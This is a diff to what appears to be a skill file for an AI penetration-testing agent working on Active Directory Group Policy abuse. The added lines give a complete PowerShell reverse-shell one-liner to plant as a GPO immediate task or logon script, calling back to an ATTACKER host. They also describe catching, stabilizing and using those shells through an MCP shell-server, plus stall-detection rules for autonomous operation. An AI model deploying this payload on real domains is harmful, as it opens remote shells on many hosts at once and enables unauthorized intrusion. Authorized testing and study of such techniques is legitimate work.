@@ -495,6 +495,29 @@ Get-GPOReport -Name "Vulnerable GPO" -ReportType Xml -Path gpo-report.xml
 
 ## Step 7: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When GPO abuse achieves code execution on target hosts, **catch shells via the
+MCP shell-server** rather than relying on local listeners or hoping the
+immediate task output is visible. GPO payloads execute asynchronously on the
+next GPO refresh (~90 min) or at logon -- the shell-server catches callbacks
+as they arrive.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Use a reverse shell as the GPO immediate task or logon script payload:
+   ```powershell
+   # Immediate task payload (SharpGPOAbuse / pyGPOAbuse):
+   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+   ```
+   Multiple hosts may call back if the GPO is linked to an OU with many
+   computers -- each callback creates a separate session.
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="whoami")`
+
+If targets lack outbound connectivity to the attackbox, use the local admin
+assignment technique (Step 3D) instead and access hosts via existing network
+paths.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
@@ -517,6 +540,45 @@ When routing, pass: GPO name, affected scope, execution context
 (SYSTEM/user), credentials obtained, and mode.
 
 Update `engagement/state.md` with GPO-based access and credentials.
+
+## Stall Detection
+
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
+
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
+
+Do not loop. Work through failures systematically:
+1. Try each variant or alternative **once**
+2. Check the Troubleshooting section for known fixes
+3. If nothing works after 5 rounds, you are stalled
+
+**When stalled, return to the orchestrator immediately with:**
+- What was attempted (commands, variants, alternatives tried)
+- What failed and why (error messages, empty responses, timeouts)
+- Assessment: **blocked** (permanent — config, patched, missing prereq) or
+  **retry-later** (may work with different context, creds, or access)
+- Update `engagement/state.md` Blocked section before returning
+
+**Mode behavior:**
+- **Guided**: Tell the user you're stalled, present what was tried, and
+  recommend the next best path.
+- **Autonomous**: Update state.md Blocked section, return findings to the
+  orchestrator. Do not retry the same technique — the orchestrator will
+  decide whether to revisit with new context or route elsewhere.
 
 ## Troubleshooting
 
